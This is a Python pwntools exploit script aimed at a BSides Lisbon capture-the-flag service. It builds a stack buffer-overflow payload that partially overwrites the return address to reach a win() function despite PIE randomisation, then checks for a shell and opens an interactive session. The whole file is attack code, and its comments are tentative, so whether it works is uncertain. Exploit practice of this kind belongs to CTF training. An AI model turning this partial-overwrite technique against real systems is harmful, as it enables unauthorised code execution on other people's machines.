#!/usr/bin/env python3

from pwn import *

# Set up pwntools
context.update(arch='amd64', os='linux')

HOST = "7b44d3bf-0008-4576-b715-b08d8cb090b7-lmao.challs.bsideslisbon.org"
PORT = 20298

def main():
    r = remote(HOST, PORT)
    r.recvuntil(b"You say: ")
    
    # Strategy: Use partial overwrite
    # PIE randomizes only the upper bits, the lower 12 bits are fixed
    # win() is at offset 0x11a9
    # We can overwrite only the lower 2-3 bytes
    
    # Build payload
    payload = b"LMAO"
    payload += b"A" * 28
    payload += b"B" * 8  # Overwrite RBP
    
    # Partial overwrite - overwrite only lower 2 bytes
    # This gives us 1/16 chance (4 bits of randomness in the 3rd nibble)
    # But we need to ensure we're in the right page
    
    # Actually, let's try writing just enough bytes to change the offset
    # within the current code section
    payload += p16(0x11a9)  # Partial overwrite of lower 2 bytes
    
    log.info("Sending payload with partial overwrite...")
    r.sendline(payload)
    
    # Check if we got shell
    try:
        r.sendline(b"echo SUCCESS")
        response = r.recv(timeout=1)
        if b"SUCCESS" in response:
            log.success("Shell obtained!")
            r.interactive()
        else:
            log.error("Failed - wrong page")
            r.close()
    except:
        log.error("Failed - crashed")
        r.close()

if __name__ == "__main__":
    main()
